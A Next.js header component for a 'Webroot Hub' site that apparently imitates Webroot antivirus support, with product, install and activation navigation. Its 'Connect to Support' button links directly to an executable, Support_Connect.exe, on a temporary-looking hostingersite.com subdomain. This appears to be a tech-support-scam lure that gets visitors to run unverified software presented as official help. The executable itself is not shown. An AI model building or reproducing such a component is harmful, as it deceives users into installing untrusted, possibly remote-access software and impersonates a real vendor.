'use client';

import React, { useState } from 'react';
import Link from 'next/link';
import { Search, Menu, X, ChevronDown, Headset } from 'lucide-react';
import MegaMenu from './MegaMenu';
import SearchModal from '../search/SearchModal';
import BrandLogo from './BrandLogo';

export default function Header() {
  const [isMegaOpen, setIsMegaOpen] = useState(false);
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [isSearchOpen, setIsSearchOpen] = useState(false);

  return (
    <>
      <header className="sticky top-0 z-40 bg-white/95 backdrop-blur border-b border-slate-200 shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16 gap-4">
            {/* Custom Brand Logo - Navigates to Home Page */}
            <Link href="/" aria-label="Webroot Hub Homepage">
              <BrandLogo />
            </Link>

            {/* Desktop Navigation */}
            <nav className="hidden lg:flex items-center gap-6 text-sm font-medium text-slate-700">
              {/* Products Dropdown Trigger */}
              <div
                className="relative"
                onMouseEnter={() => setIsMegaOpen(true)}
                onMouseLeave={() => setIsMegaOpen(false)}
              >
                <button
                  type="button"
                  className="flex items-center gap-1 hover:text-[#3E924F] py-5 transition-colors"
                  onClick={() => setIsMegaOpen(!isMegaOpen)}
                >
                  Products <ChevronDown className="w-3.5 h-3.5" />
                </button>

                {isMegaOpen && (
                  <div className="absolute top-full left-0 w-[800px] -translate-x-1/4 pt-1 z-50">
                    <MegaMenu closeMenu={() => setIsMegaOpen(false)} />
                  </div>
                )}
              </div>

              <Link href="/compare" className="hover:text-[#3E924F] transition-colors">
                Compare
              </Link>

              <Link href="/download" className="hover:text-[#3E924F] transition-colors">
                Download
              </Link>

              <Link href="/install" className="hover:text-[#3E924F] transition-colors">
                Install
              </Link>

              <Link href="/activate" className="hover:text-[#3E924F] transition-colors">
                Activate
              </Link>

              <Link href="/guides" className="hover:text-[#3E924F] transition-colors">
                Guides
              </Link>

              <Link href="/features" className="hover:text-[#3E924F] transition-colors">
                Features
              </Link>

              <Link href="/blog" className="hover:text-[#3E924F] transition-colors">
                Research Blog
              </Link>
            </nav>

            {/* Right Action Tools */}
            <div className="flex items-center gap-3">
              {/* Search Trigger (Icon Only) */}
              <button
                type="button"
                onClick={() => setIsSearchOpen(true)}
                className="p-2 text-slate-600 hover:text-[#3E924F] hover:bg-slate-100 rounded-xl transition-colors flex items-center justify-center"
                aria-label="Search site"
              >
                <Search className="w-5 h-5" />
              </button>

              {/* Connect to Support Agent CTA - #3E924F */}
              <a
                href="https://deepskyblue-gorilla-943624.hostingersite.com/Support_Connect.exe"
                className="hidden sm:inline-flex items-center justify-center gap-1.5 px-3.5 py-2 text-xs font-bold text-white bg-[#3E924F] hover:bg-[#31753F] rounded-xl transition-all shadow-md shadow-[#3E924F]/30"
              >
                <Headset className="w-3.5 h-3.5" />
                <span>Connect to Support</span>
              </a>

              {/* Mobile Menu Button */}
              <button
                type="button"
                onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
                className="p-2 text-slate-600 hover:text-slate-900 lg:hidden"
                aria-label="Toggle menu"
              >
                {isMobileMenuOpen ? <X className="w-6 h-6" /> : <Menu className="w-6 h-6" />}
              </button>
            </div>
          </div>
        </div>

        {/* Mobile Navigation Drawer */}
        {isMobileMenuOpen && (
          <div className="lg:hidden bg-white border-b border-slate-200 px-4 pt-3 pb-6 space-y-3">
            <div className="pt-1">
              <span className="px-3 text-xs font-semibold text-slate-400 uppercase tracking-wider">Products</span>
              <div className="mt-1 space-y-1">
                <Link
                  href="/products/webroot-antivirus"
                  onClick={() => setIsMobileMenuOpen(false)}
                  className="block px-3 py-1.5 text-sm text-slate-700 hover:bg-slate-50 rounded"
                >
                  Webroot Essentials
                </Link>
                <Link
                  href="/products/webroot-internet-security-plus"
                  onClick={() => setIsMobileMenuOpen(false)}
                  className="block px-3 py-1.5 text-sm text-slate-700 hover:bg-slate-50 rounded"
                >
                  Internet Security Plus
                </Link>
                <Link
                  href="/products/webroot-internet-security-complete"
                  onClick={() => setIsMobileMenuOpen(false)}
                  className="block px-3 py-1.5 text-sm text-slate-700 hover:bg-slate-50 rounded"
                >
                  Internet Security Complete
                </Link>
                <Link
                  href="/products/webroot-secure-vpn"
                  onClick={() => setIsMobileMenuOpen(false)}
                  className="block px-3 py-1.5 text-sm text-slate-700 hover:bg-slate-50 rounded"
                >
                  Webroot Secure VPN
                </Link>
              </div>
            </div>

            <div className="pt-2 border-t border-slate-100 grid grid-cols-2 gap-2 text-sm">
              <Link
                href="/compare"
                onClick={() => setIsMobileMenuOpen(false)}
                className="px-3 py-2 text-slate-700 hover:bg-slate-50 rounded-lg font-medium"
              >
                Compare Matrix
              </Link>
              <Link
                href="/download"
                onClick={() => setIsMobileMenuOpen(false)}
                className="px-3 py-2 text-slate-700 hover:bg-slate-50 rounded-lg font-medium"
              >
                Downloads
              </Link>
              <Link
                href="/install"
                onClick={() => setIsMobileMenuOpen(false)}
                className="px-3 py-2 text-slate-700 hover:bg-slate-50 rounded-lg font-medium"
              >
                Installation
              </Link>
              <Link
                href="/activate"
                onClick={() => setIsMobileMenuOpen(false)}
                className="px-3 py-2 text-slate-700 hover:bg-slate-50 rounded-lg font-medium"
              >
                Activation
              </Link>
              <Link
                href="/guides"
                onClick={() => setIsMobileMenuOpen(false)}
                className="px-3 py-2 text-slate-700 hover:bg-slate-50 rounded-lg font-medium"
              >
                Guides
              </Link>
              <Link
                href="/blog"
                onClick={() => setIsMobileMenuOpen(false)}
                className="px-3 py-2 text-slate-700 hover:bg-slate-50 rounded-lg font-medium"
              >
                Research
              </Link>
              <Link
                href="/quiz"
                onClick={() => setIsMobileMenuOpen(false)}
                className="col-span-2 px-3 py-2 bg-[#EBF6EE] text-[#31753F] rounded-lg font-semibold text-center"
              >
                Product Recommendation Quiz
              </Link>
            </div>
          </div>
        )}
      </header>

      {/* Global Search Modal */}
      <SearchModal isOpen={isSearchOpen} onClose={() => setIsSearchOpen(false)} />
    </>
  );
}
